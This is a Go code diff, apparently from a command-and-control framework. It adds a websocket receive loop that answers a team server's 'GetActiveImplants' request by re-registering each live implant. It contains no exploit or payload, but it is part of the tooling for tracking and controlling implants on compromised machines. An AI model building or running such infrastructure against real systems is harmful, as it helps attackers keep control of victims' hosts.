@@ -46,6 +46,8 @@ func StartEventHandler(token string, teamserver string) error {
 		log.Println("[error] attempting to create websocket connection", err)
 		return err
 	}
+	go RecvEvent()
+	
 	return nil
 }
 
@@ -81,4 +83,34 @@ func SendEvent(EventName string, ImpCtx Common.ImplantContext) error {
 		}
 	}
 	return nil
+}
+
+func RecvEvent() {
+	var (
+		NewWSMessage Common.NewWebSocketMessage
+		err          error
+	)
+	for {
+		err = g_clientobj.Conn.ReadJSON(&NewWSMessage)
+		if err != nil {
+			log.Println("[error] attempting to read web socket message ", err)
+			continue
+		}
+		switch NewWSMessage.MessageType {
+
+		case "GetActiveImplants":
+			for _, agent := range agent_arr {
+				if agent.Alive {
+					err = SendEvent("RegisterImplant", agent.Context)
+					if err != nil {
+						log.Println("[error] attempting to send implant data to the team server web socket connection", err)
+						continue
+					}
+				}
+			}
+			break
+		default:
+			break
+		}
+	}
 }
